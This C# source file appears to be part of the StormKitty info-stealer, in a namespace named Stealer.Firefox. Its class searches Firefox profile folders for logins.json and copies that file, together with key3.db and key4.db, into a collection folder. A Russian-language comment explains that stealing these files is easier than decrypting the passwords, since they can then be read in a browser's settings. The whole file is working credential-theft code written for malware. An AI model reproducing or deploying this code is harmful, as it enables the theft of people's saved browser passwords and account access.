using System.IO;

namespace Stealer.Firefox
{
    internal sealed class cLogins
    {
		private static string[] keyFiles = new string[] { "key3.db", "key4.db", "logins.json" };
		
		// Copy key3.db, key4.db, logins.json if exists
		private static void CopyDatabaseFile(string from, string sSavePath)
		{
			try
			{
				if (File.Exists(from))
					File.Copy(from, sSavePath + "\\" + Path.GetFileName(from));
			}
			catch (System.Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to copy logins\n" + ex); }
		}

		/*
			Дешифровка паролей Gecko браузеров - та еще жопa.
			Проще стырить два файла(key3.dll/key4.dll и logins.json)
			переместить их и посмотреть в настройках браузера.
		*/
		public static bool GetDBFiles(string path, string sSavePath)
		{
			// If browser path not exists
			if (!Directory.Exists(path)) return false;
			// Detect logins.json file
			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
			if (files == null) return false;

			foreach (string dbpath in files)
			{
				// Copy key3.db, key4.db, logins.json
				foreach (string db in keyFiles)
					CopyDatabaseFile(Path.Combine(Path.GetDirectoryName(dbpath), db), sSavePath);
			}
			return true;
		}

	}
}
